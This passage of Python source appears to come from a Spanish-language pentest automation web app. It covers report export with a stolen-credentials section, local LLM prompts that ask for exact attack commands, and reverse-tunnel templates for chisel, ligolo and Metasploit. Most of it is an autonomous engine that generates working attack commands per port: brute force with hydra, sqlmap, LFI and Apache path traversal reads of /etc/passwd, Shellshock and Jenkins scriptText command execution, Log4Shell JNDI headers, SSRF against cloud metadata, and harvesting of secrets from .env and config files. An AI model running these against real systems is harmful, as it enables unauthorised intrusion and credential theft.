            if f.get("cve"):
                meta_rows_f.append(("CVE", f["cve"]))
            hosts = ", ".join(f.get("hosts") or []) or "—"
            meta_rows_f.append(("Hosts afectados", hosts))
            meta_rows_f.append(("Estado", f.get("status", "open").capitalize()))

            ft = doc.add_table(rows=len(meta_rows_f), cols=2)
            ft.style = "Table Grid"
            for ri, (k, v) in enumerate(meta_rows_f):
                ft.rows[ri].cells[0].text = k
                ft.rows[ri].cells[0].paragraphs[0].runs[0].font.bold = True
                _docx_set_cell_bg(ft.rows[ri].cells[0], "F2F3F4")
                ft.rows[ri].cells[1].text = v
                if ri == 0:  # Severidad — colored
                    ft.rows[ri].cells[1].paragraphs[0].runs[0].font.bold = True
                    _docx_set_cell_bg(ft.rows[ri].cells[1], color)
                    ft.rows[ri].cells[1].paragraphs[0].runs[0].font.color.rgb = \
                        RGBColor(0xFF, 0xFF, 0xFF)

            doc.add_paragraph()

            if f.get("description"):
                doc.add_paragraph("Descripción", style="Heading 3")
                doc.add_paragraph(f["description"])

            if f.get("evidence"):
                doc.add_paragraph("Evidencia / Prueba de Concepto", style="Heading 3")
                ev_p = doc.add_paragraph()
                ev_run = ev_p.add_run(f["evidence"][:2500])
                ev_run.font.name = "Courier New"
                ev_run.font.size = Pt(8)

            if f.get("remediation"):
                doc.add_paragraph("Remediación", style="Heading 3")
                doc.add_paragraph(f["remediation"])

            doc.add_paragraph()

    doc.add_page_break()

    # ── CREDENCIALES / LOOT ───────────────────────────────────────────────────
    creds = [i for i in loot if i.get("type") == "credential"]
    flags = [i for i in loot if i.get("type") == "flag"]
    notes = [i for i in loot if i.get("type") not in ("credential", "flag")]

    doc.add_heading("4. Credenciales y Datos Sensibles Obtenidos", level=1)
    if creds:
        doc.add_paragraph(
            f"Durante la evaluación se obtuvieron {len(creds)} conjunto(s) de credenciales válidas, "
            "lo que demuestra la posibilidad de acceso no autorizado a los sistemas afectados."
        )
        ct2 = doc.add_table(rows=1 + len(creds), cols=3)
        ct2.style = "Table Grid"
        for header_text, ci in [("Credencial", 0), ("Tipo", 1), ("Fuente", 2)]:
            ct2.rows[0].cells[ci].text = header_text
            ct2.rows[0].cells[ci].paragraphs[0].runs[0].font.bold = True
            _docx_set_cell_bg(ct2.rows[0].cells[ci], "1A1A2E")
            ct2.rows[0].cells[ci].paragraphs[0].runs[0].font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
        for i, item in enumerate(creds, start=1):
            ct2.rows[i].cells[0].text = item.get("value", "")
            ct2.rows[i].cells[1].text = item.get("type", "")
            ct2.rows[i].cells[2].text = item.get("source", "")
    else:
        doc.add_paragraph("No se obtuvieron credenciales durante la evaluación.")

    if flags:
        doc.add_paragraph()
        doc.add_heading("Flags / Proof of Compromise", level=2)
        for item in flags:
            p_flag = doc.add_paragraph(style="List Bullet")
            p_flag.add_run(item.get("value", ""))

    if notes:
        doc.add_paragraph()
        doc.add_heading("Otros datos relevantes", level=2)
        for item in notes[:30]:
            p_n = doc.add_paragraph(style="List Bullet")
            p_n.add_run(f"[{item.get('type','')}] {item.get('value','')}")

    doc.add_page_break()

    # ── ROADMAP DE REMEDIACIÓN ────────────────────────────────────────────────
    doc.add_heading("5. Roadmap de Remediación", level=1)
    doc.add_paragraph(
        "La siguiente tabla presenta los hallazgos ordenados por prioridad de remediación, "
        "considerando el riesgo real y el esfuerzo estimado de corrección."
    )

    rt = doc.add_table(rows=1 + len(findings), cols=4)
    rt.style = "Table Grid"
    for hdr_text, ci in [("#", 0), ("Hallazgo", 1), ("Severidad", 2), ("Plazo estimado", 3)]:
        rt.rows[0].cells[ci].text = hdr_text
        rt.rows[0].cells[ci].paragraphs[0].runs[0].font.bold = True
        _docx_set_cell_bg(rt.rows[0].cells[ci], "1A1A2E")
        rt.rows[0].cells[ci].paragraphs[0].runs[0].font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)

    for i, f in enumerate(findings, start=1):
        sev = f.get("severity", "info")
        rt.rows[i].cells[0].text = str(i)
        rt.rows[i].cells[1].text = f.get("title", "")[:80]
        rt.rows[i].cells[2].text = SEV_LABEL.get(sev, sev.upper())
        _docx_set_cell_bg(rt.rows[i].cells[2], SEV_HEX.get(sev, "888888"))
        rt.rows[i].cells[2].paragraphs[0].runs[0].font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
        rt.rows[i].cells[3].text = SEV_EFFORT.get(sev, "—")

    # ── GUARDAR Y RETORNAR ────────────────────────────────────────────────────
    bio = BytesIO()
    doc.save(bio)
    bio.seek(0)
    return bio.read()


@app.route("/api/projects/<project_id>/report/docx")
@api_login_required
def export_docx_report(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    try:
        docx_bytes = _generate_docx_report(project)
    except ImportError as e:
        return jsonify({"error": str(e)}), 500
    safe_name = re.sub(r'[^\w\-]', '_', project.get("name", "report"))
    resp = make_response(docx_bytes)
    resp.headers["Content-Type"] = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    resp.headers["Content-Disposition"] = f'attachment; filename="{safe_name}_report.docx"'
    return resp


@app.route("/api/projects/<project_id>/findings/enrich-cvss", methods=["POST"])
@api_login_required
def enrich_findings_cvss(project_id):
    """Retroactively assign CVSS v3.1 vectors to all findings missing them."""
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    enriched = 0
    for f in project.get("findings", []):
        if not f.get("cvss_vector"):
            _enrich_finding_cvss(f)
            enriched += 1
    write_project(project)
    return jsonify({"enriched": enriched})


# ── Ollama / AI Analysis ───────────────────────────────────────────────────

AI_PROMPTS = {
    "analyze":    "Eres un experto en ciberseguridad ofensiva. Analiza este output de pentesting: hallazgos importantes, vulnerabilidades, próximos pasos. Responde en español, de forma concisa.\n\nOutput:\n{text}",
    "explain":    "Explica brevemente qué significa este output/comando de pentesting para un auditor. Responde en español.\n\nContenido:\n{text}",
    "next_steps": "Como pentester experto, lista 3-5 próximas acciones de ataque/enumeración con comandos exactos basándote en este output. Responde en español.\n\nOutput:\n{text}",
    "finding":    "Convierte este output en un finding de informe de auditoría con: Título, Severidad, Descripción, Impacto, y Remediación. Responde en español.\n\nOutput:\n{text}",
    "custom":     "{text}",
}

@app.route("/api/ai/models")
@api_login_required
def ai_list_models():
    try:
        import urllib.request as _req
        with _req.urlopen("http://localhost:11434/api/tags", timeout=3) as r:
            data = json.loads(r.read())
            models = [m["name"] for m in data.get("models", [])]
            return jsonify({"models": models, "available": True})
    except Exception:
        return jsonify({"models": [], "available": False})

@app.route("/api/ai/analyze", methods=["POST"])
@api_login_required
def ai_analyze():
    data = request.json or {}
    text = data.get("text", "").strip()[:6000]
    prompt_type = data.get("type", "analyze")
    model = data.get("model", "llama3")
    custom_prompt = data.get("custom_prompt", "")
    if not text:
        return jsonify({"error": "text required"}), 400
    template = AI_PROMPTS.get(prompt_type, AI_PROMPTS["analyze"])
    if prompt_type == "custom" and custom_prompt:
        template = custom_prompt + "\n\n{text}"
    prompt = template.replace("{text}", text)
    try:
        import urllib.request as _req, urllib.error
        body = json.dumps({"model": model, "prompt": prompt, "stream": False}).encode()
        req = _req.Request("http://localhost:11434/api/generate",
                           data=body, headers={"Content-Type": "application/json"}, method="POST")
        with _req.urlopen(req, timeout=120) as resp:
            result = json.loads(resp.read())
            return jsonify({"response": result.get("response",""), "model": model, "prompt_type": prompt_type})
    except Exception as e:
        return jsonify({"error": f"Ollama no disponible (localhost:11434): {e}"}), 503


# ── Tunnel / Proxy Manager ────────────────────────────────────────────────

TUNNEL_TEMPLATES = [
    {"id":"chisel_server",  "name":"Chisel Server (atacante)",    "icon":"fa-server",        "color":"#58a6ff", "side":"attacker", "type":"chisel",
     "cmd":"chisel server --port {lport} --reverse --socks5",
     "desc":"Inicia el servidor chisel con SOCKS5 reverso"},
    {"id":"chisel_socks",   "name":"Chisel SOCKS (víctima)",      "icon":"fa-plug",          "color":"#3fb950", "side":"victim",   "type":"chisel",
     "cmd":"./chisel client {lhost}:{lport} R:socks",
     "desc":"Conecta víctima al chisel server → SOCKS5 en atacante"},
    {"id":"chisel_fwd",     "name":"Chisel Port-Forward",         "icon":"fa-arrows-left-right","color":"#d29922","side":"victim",  "type":"chisel",
     "cmd":"./chisel client {lhost}:{lport} R:{fwdport}:127.0.0.1:{fwdport}",
     "desc":"Forwardea un puerto de víctima al atacante"},
    {"id":"ligolo_proxy",   "name":"Ligolo-ng Proxy (atacante)",  "icon":"fa-shield-halved", "color":"#f0883e", "side":"attacker", "type":"ligolo",
     "cmd":"ligolo-ng -selfcert -laddr 0.0.0.0:{lport}",
     "desc":"Inicia el proxy de ligolo-ng en el atacante"},
    {"id":"ssh_socks",      "name":"SSH Dynamic SOCKS5",          "icon":"fa-terminal",      "color":"#8b949e", "side":"attacker", "type":"ssh",
     "cmd":"ssh -D {lport} -N -f {user}@{rhost} -p {sshport}",
     "desc":"Túnel SOCKS5 dinámico via SSH"},
    {"id":"sshuttle",       "name":"SSHuttle (VPN over SSH)",     "icon":"fa-network-wired", "color":"#f85149", "side":"attacker", "type":"sshuttle",
     "cmd":"sshuttle -r {user}@{rhost} {subnet}/24 --ssh-cmd 'ssh -p {sshport}'",
     "desc":"VPN completa sobre SSH - enruta todo el tráfico"},
    {"id":"proxychains_cfg","name":"Generar proxychains.conf",    "icon":"fa-file-code",     "color":"#6e7681", "side":"attacker", "type":"config",
     "cmd":"printf 'strict_chain\\nproxy_dns\\n[ProxyList]\\nsocks5 127.0.0.1 {lport}\\n' > /tmp/proxychains.conf && cat /tmp/proxychains.conf",
     "desc":"Genera config de proxychains con SOCKS5 local"},
    {"id":"msf_socks",      "name":"MSF SOCKS Plugin",            "icon":"fa-terminal",      "color":"#d29922", "side":"attacker", "type":"msf",
     "cmd":"msfconsole -q -x 'use auxiliary/server/socks_proxy; set SRVPORT {lport}; set VERSION 5; run -j'",
     "desc":"Inicia SOCKS5 desde Metasploit"},
]

@app.route("/api/tunnels/templates")
@api_login_required
def list_tunnel_templates():
    return jsonify(TUNNEL_TEMPLATES)

@app.route("/api/projects/<project_id>/scope", methods=["GET"])
@api_login_required
def get_scope(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    return jsonify(project.get("scope_config", {"includes": [], "excludes": [], "notes": ""}))

@app.route("/api/projects/<project_id>/scope", methods=["PUT"])
@api_login_required
def save_scope(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    project["scope_config"] = request.json
    write_project(project)
    return jsonify({"ok": True})


# ── Autonomous Pentest Engine ─────────────────────────────────────────────────

MODE_CONFIG = {
    "stealth": {
        "nmap_timing": "T1", "nmap_extra": "--max-rate 100 --scan-delay 2s --top-ports 1000",
        "threads": 5, "brute_force": False, "delay_between_jobs": 10,
        "workers": 1, "job_timeout": 600,
    },
    "normal": {
        "nmap_timing": "T3", "nmap_extra": "--min-rate 1000 -p-",
        "threads": 20, "brute_force": True, "delay_between_jobs": 2,
        "workers": 3, "job_timeout": 240,
    },
    "aggressive": {
        "nmap_timing": "T4", "nmap_extra": "--min-rate 5000 -p-",
        "threads": 50, "brute_force": True, "delay_between_jobs": 0,
        "workers": 5, "job_timeout": 120,
    },
}

def _kb_commands(port, service, version, target, mode):
    cfg = MODE_CONFIG.get(mode, MODE_CONFIG["normal"])
    t = cfg["threads"]
    svc = service.lower()
    ver = version.lower()
    cmds = []

    # ── HTTP / HTTPS ──────────────────────────────────────────────────────────
    if port in (80, 443, 8080, 8443, 8000, 8008, 8888, 9090, 3000) or "http" in svc:
        scheme = "https" if (port in (443, 8443) or "ssl" in svc or "https" in svc) else "http"
        url = f"{scheme}://{target}:{port}"
        cmds += [
            (10, f"WhatWeb:{port}",
             f"whatweb -a 3 {url} 2>/dev/null"),
            (12, f"Web-Headers:{port}",
             f"curl -s -I -L --max-time 10 '{url}' 2>/dev/null | head -30"),
            (15, f"Web-Robots-Sitemap:{port}",
             f"curl -s --max-time 8 '{url}/robots.txt' 2>/dev/null; "
             f"curl -s --max-time 8 '{url}/sitemap.xml' 2>/dev/null | head -20"),
            (18, f"Web-DefaultCreds:{port}",
             f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{url}/admin' 2>/dev/null; "
             f"curl -s -o /dev/null -w ' %{{http_code}}' --max-time 5 '{url}/manager' 2>/dev/null; "
             f"curl -s -o /dev/null -w ' %{{http_code}}' --max-time 5 '{url}/wp-login.php' 2>/dev/null; "
             f"curl -s -o /dev/null -w ' %{{http_code}}' --max-time 5 '{url}/phpmyadmin' 2>/dev/null"),
            (20, f"Gobuster-dirs:{port}",
             f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt"
             f" -t {t} -x php,html,txt,asp,aspx,jsp,bak,old -q --no-error 2>/dev/null"),
            (22, f"Nikto:{port}", f"nikto -h {url} -C all -maxtime 120 2>/dev/null"),
            (25, f"FFUF-fuzz:{port}",
             f"ffuf -u {url}/FUZZ"
             f" -w /usr/share/seclists/Discovery/Web-Content/common.txt"
             f" -mc 200,204,301,302,307,401,403 -t {t} -s 2>/dev/null | head -80"
             f" || gobuster dir -u {url}"
             f" -w /usr/share/seclists/Discovery/Web-Content/common.txt"
             f" -t {t} -q --no-error 2>/dev/null | head -80"),
        ]
        # SQLi + LFI quick check for common GET parameters
        cmds += [
            (28, f"SQLi-Quick:{port}",
             f"curl -s --max-time 8 '{url}/?id=1%27' 2>/dev/null | grep -iE 'sql|syntax|mysql|oracle|ORA-|pg_|sqlite' | head -5; "
             f"curl -s --max-time 8 '{url}/index.php?page=../../../etc/passwd' 2>/dev/null | grep -c 'root:' || true"),
            (29, f"Web-LFI-Check:{port}",
             f"for p in page file include path template view; do "
             f"r=$(curl -s --max-time 5 '{url}/?'$p'=../../../../etc/passwd' 2>/dev/null | grep -c 'root:' || true); "
             f"[ \"$r\" -gt 0 ] && echo \"LFI FOUND param=$p\" && break; done; "
             f"curl -s --max-time 5 '{url}/.git/HEAD' 2>/dev/null | head -1"),
        ]
        if mode in ("normal", "aggressive") and cfg["brute_force"]:
            cmds += [
                (50, f"Web-Admin-Brute:{port}",
                 f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt"
                 f" -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
                 f" -s {port} {target} http-get /manager/html -t 4 2>/dev/null; "
                 f"hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
                 f" -s {port} {target} http-post-form '/login:username=^USER^&password=^PASS^:Invalid' -t 4 2>/dev/null | head -10"),
            ]
        if mode in ("normal", "aggressive"):
            cmds += [
                (35, f"Nuclei:{port}",
                 f"nuclei -u {url} -severity critical,high,medium -j -c 25 -timeout 15 2>/dev/null"),
                (38, f"Nuclei-DefaultLogins:{port}",
                 f"nuclei -u {url} -t default-logins/ -j -c 10 -timeout 10 2>/dev/null"),
                (39, f"Nuclei-Exposures:{port}",
                 f"nuclei -u {url} -t exposures/ -t exposed-panels/ -t misconfiguration/ -j -c 15 -timeout 10 2>/dev/null"),
                # JS secrets: crawl JS files then grep for API keys, tokens, endpoints
                (43, f"JS-Secrets:{port}",
                 f"JSURLS=$(katana -u {url} -d 3 -jc -ef css,png,jpg,gif,ico,woff,ttf -silent 2>/dev/null | grep -E '\\.js(\\?|$)' | sort -u | head -40); "
                 f"if [ -z \"$JSURLS\" ]; then "
                 f"JSURLS=$(curl -s --max-time 10 '{url}/' 2>/dev/null | grep -oP '(src|href)=[\"\\x27]\\K[^\"\\x27]+\\.js[^\"\\x27]*' | sed 's|^/|{url}/|' | head -20); fi; "
                 f"echo \"$JSURLS\" | while read -r jsurl; do "
                 f"[ -z \"$jsurl\" ] && continue; "
                 f"content=$(curl -s --max-time 10 \"$jsurl\" 2>/dev/null | head -c 200000); "
                 f"echo \"=== $jsurl ===\"; "
                 f"echo \"$content\" | grep -oP '(?i)(api[_-]?key|apikey|access[_-]?token|auth[_-]?token|secret[_-]?key|client[_-]?secret|aws[_-]?access|aws[_-]?secret|firebase|twilio|stripe|sendgrid|mailchimp|slack[_-]?token|github[_-]?token|bearer\\s+[a-zA-Z0-9._-]{{20,}}|eyJ[a-zA-Z0-9._-]{{40,}})[^\\s\\'\\\"<>]{{0,80}}' | sort -u | head -15; "
                 f"echo \"$content\" | grep -oP '(https?://[a-zA-Z0-9./_-]{{8,}}api[a-zA-Z0-9./_?=-]{{0,60}}|/v[0-9]+/[a-zA-Z0-9/_-]{{3,40}})' | sort -u | head -10; "
                 f"done 2>/dev/null | head -100"),
                # JWT detection and analysis
                (44, f"JWT-Analysis:{port}",
                 f"RESP=$(curl -s -I --max-time 8 '{url}/' 2>/dev/null); "
                 f"JWT=$(echo \"$RESP\" | grep -oP 'eyJ[a-zA-Z0-9._-]{{20,}}'); "
                 f"if [ -z \"$JWT\" ]; then "
                 f"JWT=$(curl -s --max-time 8 '{url}/' 2>/dev/null | grep -oP 'eyJ[a-zA-Z0-9._-]{{20,}}' | head -1); fi; "
                 f"if [ -n \"$JWT\" ]; then "
                 f"echo \"JWT_FOUND: $JWT\"; "
                 f"python3 -c \""
                 f"import base64,json,sys; t=sys.argv[1]; parts=t.split('.'); "
                 f"[print(json.dumps(json.loads(base64.b64decode(p+'=='*3)[:512]),indent=2)) for p in parts[:2] if p]; "
                 f"alg=json.loads(base64.b64decode(parts[0]+'=='*3)).get('alg',''); "
                 f"print('Algorithm:',alg); "
                 f"print('NONE_ALG_VULN' if alg.lower() in ('none','') else 'alg ok')"
                 f"\" \\\"$JWT\\\" 2>/dev/null; "
                 f"jwt_tool \\\"$JWT\\\" -X a 2>/dev/null | head -15; "
                 f"jwt_tool \\\"$JWT\\\" -X s 2>/dev/null | head -10; "
                 f"jwt_tool \\\"$JWT\\\" -C -d /usr/share/wordlists/rockyou.txt 2>/dev/null | grep -i 'crack\\|secret\\|key' | head -5; "
                 f"else echo 'No JWT found in headers/response'; fi"),
                # GraphQL probe — introspection + endpoint discovery
                (45, f"GraphQL-Probe:{port}",
                 f"_graphql_found=0; "
                 f"for ep in /graphql /api/graphql /graphiql /v1/graphql /graphql/v1 /query /api/query /gql; do "
                 f"C=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 -X POST '{url}$ep' "
                 f"-H 'Content-Type: application/json' -d '{{\"query\":\"{{__typename}}\"}}' 2>/dev/null); "
                 f"if [ \"$C\" = '200' ] || [ \"$C\" = '400' ]; then "
                 f"echo \"GRAPHQL_ENDPOINT: {url}$ep (HTTP $C)\"; _graphql_found=1; "
                 f"SCHEMA=$(curl -s --max-time 10 -X POST '{url}$ep' -H 'Content-Type: application/json' "
                 f"-d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' 2>/dev/null); "
                 f"echo \"$SCHEMA\" | python3 -c 'import json,sys; d=json.loads(sys.stdin.read()); "
                 f"ts=d.get(\\\"data\\\",{{}}).get(\\\"__schema\\\",{{}}).get(\\\"types\\\",[]); "
                 f"[print(t[\\\"name\\\"]) for t in ts if not t[\\\"name\\\"].startswith(\\\"__\\\")]' 2>/dev/null | head -20; "
                 f"[ $(echo \"$SCHEMA\" | grep -c '\"types\"') -gt 0 ] && echo 'GRAPHQL_INTROSPECTION_ENABLED' || echo 'Introspection disabled'; "
                 f"break; fi; done; "
                 f"[ $_graphql_found -eq 0 ] && echo 'No GraphQL endpoint found'"),
                # CORS misconfiguration check
                (46, f"CORS-Check:{port}",
                 f"CORS=$(curl -s -I --max-time 8 -H 'Origin: https://evil.example.com' '{url}/' 2>/dev/null | grep -i 'access-control'); "
                 f"[ -n \"$CORS\" ] && echo \"$CORS\"; "
                 f"echo \"$CORS\" | grep -q 'evil.example.com' && echo 'CORS_MISCONFIGURED: reflects arbitrary origin'; "
                 f"echo \"$CORS\" | grep -q '\\*' && echo 'CORS_MISCONFIGURED: wildcard (*) origin allowed'; "
                 f"CRED_CORS=$(curl -s -I --max-time 8 -H 'Origin: null' '{url}/' 2>/dev/null | grep -i 'access-control'); "
                 f"echo \"$CRED_CORS\" | grep -qi 'null' && echo 'CORS_MISCONFIGURED: null origin accepted'; true"),
                # REST API endpoint discovery
                (47, f"API-Endpoints:{port}",
                 f"for ep in /api /api/v1 /api/v2 /api/v3 /rest /swagger.json /swagger-ui.html /openapi.json /v1 /v2 /api-docs /docs; do "
                 f"C=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{url}$ep' 2>/dev/null); "
                 f"[ \"$C\" != '404' ] && [ \"$C\" != '000' ] && echo \"API: {url}$ep [$C]\"; done; "
                 f"curl -s --max-time 8 '{url}/swagger.json' 2>/dev/null | python3 -c "
                 f"'import json,sys; d=json.load(sys.stdin); "
                 f"[print(m.upper(),p) for p,ops in d.get(\\\"paths\\\",{{}}).items() for m in ops if m in [\\\"get\\\",\\\"post\\\",\\\"put\\\",\\\"delete\\\",\\\"patch\\\"]]' "
                 f"2>/dev/null | head -30 || true"),
            ]
        if mode == "aggressive":
            cmds += [
                (40, f"Gobuster-vhosts:{port}",
                 f"gobuster vhost -u {url}"
                 f" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
                 f" -t {t} -q 2>/dev/null"),
                (42, f"SQLMap-Auto:{port}",
                 f"hakrawler -url {url} -depth 2 2>/dev/null | head -50"
                 f" | xargs -I@ sqlmap -u @ --batch --level 1 --risk 1 --dbs --timeout 10 -q 2>/dev/null | head -30"
                 f" || sqlmap -u '{url}/?id=1' --batch --level 1 --risk 1 -q 2>/dev/null | head -30"),
                # Dalfox — advanced XSS scanner replacing basic curl check
                (45, f"Dalfox-XSS:{port}",
                 f"which dalfox 2>/dev/null && ("
                 f"dalfox url '{url}/?q=test' --skip-bav --no-color -w 20 --timeout 10 2>/dev/null | head -30; "
                 f"PARAMS=$(curl -s --max-time 8 '{url}/' 2>/dev/null | grep -oP '(name|id)=[\"\\x27]\\K[^\"\\x27]+' | sort -u | head -10); "
                 f"for p in $PARAMS; do "
                 f"dalfox url \"{url}/?$p=test\" --skip-bav --no-color --timeout 8 2>/dev/null | grep -i 'XSS\\|FOUND\\|POC' | head -3; done"
                 f") || ("
                 f"curl -s --max-time 8 '{url}/?q=<script>alert(1)</script>' 2>/dev/null | grep -o '<script>alert(1)</script>' | head -1; "
                 f"curl -s --max-time 8 '{url}/search?q=<img+src=x+onerror=alert(1)>' 2>/dev/null | grep -o 'onerror=alert' | head -1)"),
                # SSRF parameter fuzzing
                (48, f"SSRF-Fuzz:{port}",
                 f"LHOST=$(hostname -I | awk '{{print $1}}'); "
                 f"BASELINE=$(curl -s --max-time 5 '{url}/' 2>/dev/null | wc -c); "
                 f"for ssrf_param in url redirect redirect_to return return_to next dest destination path file image proxy load callback img data; do "
                 f"R_LEN=$(curl -s --max-time 5 '{url}/?'$ssrf_param'=http://127.0.0.1:65534/' 2>/dev/null | wc -c); "
                 f"[ \"$R_LEN\" -gt 0 ] && [ \"$R_LEN\" -ne \"$BASELINE\" ] && echo \"SSRF_CANDIDATE: param=$ssrf_param len_diff=$((R_LEN - BASELINE))\"; "
                 f"R2=$(curl -s --max-time 5 "
                 f"'{url}/?'$ssrf_param'=http://169.254.169.254/latest/meta-data/' 2>/dev/null | head -10); "
                 f"echo \"$R2\" | grep -qE '(ami-id|instance-id|instance-type|local-hostname|security-credentials|AccessKeyId|block-device-mapping)' "
                 f"&& echo \"SSRF_CLOUD_METADATA_CONFIRMED: $ssrf_param → $(echo $R2 | head -c 200)\"; done; "
                 f"# SSRF via headers "
                 f"for h in X-Forwarded-For Referer X-Real-IP Client-IP X-Custom-IP-Authorization; do "
                 f"curl -s --max-time 5 -H \"$h: 169.254.169.254\" '{url}/' 2>/dev/null | grep -i 'ami-id\\|instance-id\\|iam\\|security-credentials' | head -2; done"),
                # IDOR detection
                (49, f"IDOR-Probe:{port}",
                 f"# Probe for IDOR patterns on common API endpoints"
                 f"for path in /api/v1/user /api/v1/users /api/v2/user /api/users /user /users /account /profile; do "
                 f"C=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{url}$path/1' 2>/dev/null); "
                 f"[ \"$C\" = '200' ] && echo \"IDOR_CANDIDATE: {url}$path/1 [$C] — try /2 /3 ...\" && "
                 f"curl -s --max-time 5 '{url}$path/2' 2>/dev/null | python3 -c 'import json,sys; d=json.loads(sys.stdin.read()); print(list(d.keys())[:10])' 2>/dev/null | head -3; done"),
            ]
        # WordPress/Drupal/Joomla specific
        if "wordpress" in ver or "wp" in ver:
            cmds.append((32, f"WPScan:{port}",
                f"wpscan --url {url} --enumerate u,vp,ap --no-banner 2>/dev/null | head -80"))
        if "drupal" in ver:
            cmds.append((32, f"Droopescan:{port}",
                f"droopescan scan drupal -u {url} 2>/dev/null | head -40"))

        # ── Direct vulnerability probes (no nmap needed) ────────────────────
        cmds += [
            # Apache 2021 path traversal + Shellshock
            (33, f"Apache-PathTraversal:{port}",
             f"curl -s --path-as-is --max-time 8 '{url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>/dev/null | grep -q 'root:' && echo 'root:x:0:0:root:/root:/bin/bash'; "
             f"curl -s --path-as-is --max-time 8 '{url}/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>/dev/null | grep -q 'root:' && echo 'root:x:0:0:root:/root:/bin/bash'; true"),
            (33, f"Shellshock-CGI:{port}",
             f"curl -s --max-time 8 -A '() {{ :; }}; echo; echo SHELLSHOCK_RCE; id' '{url}/cgi-bin/test.cgi' 2>/dev/null | head -5; "
             f"curl -s --max-time 8 -A '() {{ :; }}; echo; echo SHELLSHOCK_RCE; id' '{url}/cgi-bin/admin.cgi' 2>/dev/null | head -5; "
             f"curl -s --max-time 8 -H 'Referer: () {{ :; }}; echo; echo SHELLSHOCK_RCE; id' '{url}/cgi-bin/' 2>/dev/null | grep SHELLSHOCK | head -3"),
            # Log4Shell probe (JNDI injection via common headers)
            (34, f"Log4Shell-Probe:{port}",
             f"curl -s --max-time 8 '{url}/' "
             f"-H 'X-Api-Version: ${{jndi:ldap://127.0.0.1:1389/log4}}' "
             f"-H 'X-Forwarded-For: ${{jndi:ldap://127.0.0.1:1389/log4}}' "
             f"-H 'User-Agent: ${{jndi:ldap://127.0.0.1:1389/log4}}' 2>/dev/null | grep -iE 'error|exception|ldap|jndi' | head -3"),
            # Sensitive files
            (34, f"DotEnv-Sensitive:{port}",
             f"R=$(curl -s --max-time 8 '{url}/.env' 2>/dev/null); "
             f"echo \"$R\" | grep -iE 'APP_KEY|DB_PASSWORD|SECRET|TOKEN|API_KEY' | head -8; "
             f"curl -s --max-time 6 '{url}/.env.backup' 2>/dev/null | grep -i 'password\\|secret\\|key' | head -3; "
             f"curl -s --max-time 6 '{url}/config.php' 2>/dev/null | grep -iE 'password.*=|passwd.*=' | head -3; "
             f"curl -s --max-time 6 '{url}/wp-config.php' 2>/dev/null | grep -iE 'DB_PASSWORD|DB_USER|table_prefix' | head -5"),
            # phpinfo + backup files
            (35, f"PHPInfo-Backup:{port}",
             f"for f in phpinfo.php info.php test.php; do "
             f"C=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{url}/$f'); "
             f"[ \"$C\" = \"200\" ] && echo \"PHPINFO_EXPOSED:$f\"; done; "
             f"for bak in backup.zip backup.tar.gz backup.sql database.sql db.sql site.zip www.tar.gz; do "
             f"C=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{url}/$bak'); "
             f"[ \"$C\" = \"200\" ] && echo \"BACKUP_FILE_FOUND:$bak\"; done"),
            # Directory listing
            (35, f"DirListing-Check:{port}",
             f"curl -s --max-time 8 '{url}/' 2>/dev/null | grep -iE 'Index of|Parent Directory|\\[DIR\\]|Directory listing' | head -3; "
             f"curl -s --max-time 8 '{url}/uploads/' 2>/dev/null | grep -iE 'Index of|Parent Directory' | head -2"),
            # Spring4Shell
            (36, f"Spring4Shell-Probe:{port}",
             f"curl -s --max-time 8 -X POST '{url}/?' "
             f"--data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=SPRING4SHELL_TEST' 2>/dev/null | head -3"),
            # Tomcat manager detection
            (28, f"Tomcat-DefaultCreds:{port}",
             f"for u in admin tomcat manager role1 both; do "
             f"for p in admin tomcat manager password s3cret ''; do "
             f"C=$(curl -s -o /dev/null -w '%{{http_code}}' -u \"$u:$p\" --max-time 5 '{url}/manager/html'); "
             f"[ \"$C\" = \"200\" ] && echo \"TOMCAT_CREDS_VALID:$u:$p\" && break 2; done; done"),
            # Jenkins
            (29, f"Jenkins-Detection:{port}",
             f"C=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{url}/'); "
             f"H=$(curl -s -I --max-time 5 '{url}/' 2>/dev/null | grep -i 'X-Jenkins:\\|x-jenkins-session'); "
             f"[ -n \"$H\" ] && echo \"X-Jenkins: $H\"; "
             f"curl -s --max-time 8 -X POST '{url}/scriptText' -d 'script=println(\"id\".execute().text)' 2>/dev/null | head -3"),
        ]
        # Heartbleed for HTTPS
        if port in (443, 8443) or "ssl" in svc or "https" in svc:
            cmds += [
                (25, f"Heartbleed-Check:{port}",
                 f"nmap -p {port} --script ssl-heartbleed --script-timeout 15s {target} 2>/dev/null | grep -i 'VULNERABLE\\|heartbleed\\|safe' | head -5; "
                 f"openssl s_client -connect {target}:{port} -heartbleed 2>/dev/null | grep -i 'heartbeat' | head -3"),
                (26, f"SSL-Poodle-Sweet32:{port}",
                 f"nmap -p {port} --script ssl-poodle,ssl-dh-params --script-timeout 15s {target} 2>/dev/null | grep -iE 'VULNERABLE|poodle|SWEET32|weak' | head -5"),
            ]

    # ── SSH ───────────────────────────────────────────────────────────────────
    if port == 22 or "ssh" in svc:
        cmds += [
            (10, f"SSH-Audit:{port}",
